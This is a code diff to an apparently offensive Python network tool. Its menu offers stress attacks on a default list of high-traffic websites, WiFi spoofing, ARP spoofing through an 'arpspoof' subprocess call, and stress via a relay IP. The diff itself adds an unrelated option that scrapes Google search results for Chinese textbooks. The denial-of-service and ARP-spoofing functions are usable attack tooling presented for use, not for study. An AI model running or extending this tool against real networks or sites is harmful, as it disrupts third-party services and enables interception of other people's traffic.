@@ -5,6 +5,7 @@ import asyncio
 import random
 import argparse
 import subprocess
+from googlesearch import search
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -68,6 +69,15 @@ def arp_spoofing(target_ip, spoof_ip):
     command = ["arpspoof", "-t", target_ip, spoof_ip]
     subprocess.run(command)
 
+def scrape_chinese_textbooks(query):
+    results = search(query, num_results=10, lang="zh")
+    return results
+
+def display_books(books):
+    for book in books:
+        print(f"Link: {book}")
+        print("-" * 20)
+
 def display_ui():
     print("""
      ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░██████[...]
@@ -83,11 +93,12 @@ def display_ui():
     [4] WiFi Spoofing
     [5] ARP Spoofing
     [6] Connect and Stress via Relay IP
+    [7] Scrape Chinese Textbooks
     """)
 
 if __name__ == "__main__":
     display_ui()
-    choice = input("Select the method (1-6): ").strip()
+    choice = input("Select the method (1-7): ").strip()
     ip_address = None
     urls = default_urls
 
@@ -97,7 +108,6 @@ if __name__ == "__main__":
         ip_address = input("Enter the IP address to use: ").strip()
     elif choice == "3":
         print("Selected Wireless WiFi-based")
-        # Additional setup for WiFi-based stress can be added here
     elif choice == "4":
         print("Selected WiFi Spoofing")
         wifi_spoofing()
@@ -111,6 +121,10 @@ if __name__ == "__main__":
         relay_ip = input("Enter the relay IP address: ").strip()
         print("Selected Connect and Stress via Relay IP")
         connect_and_stress(target_ip, relay_ip)
+    elif choice == "7":
+        query = input("Enter the search query in Chinese: ").strip()
+        books = scrape_chinese_textbooks(query)
+        display_books(books)
 
     # Start Network stress in multiple threads if choice is 1, 2, or 3
     if choice in ["1", "2", "3"]:
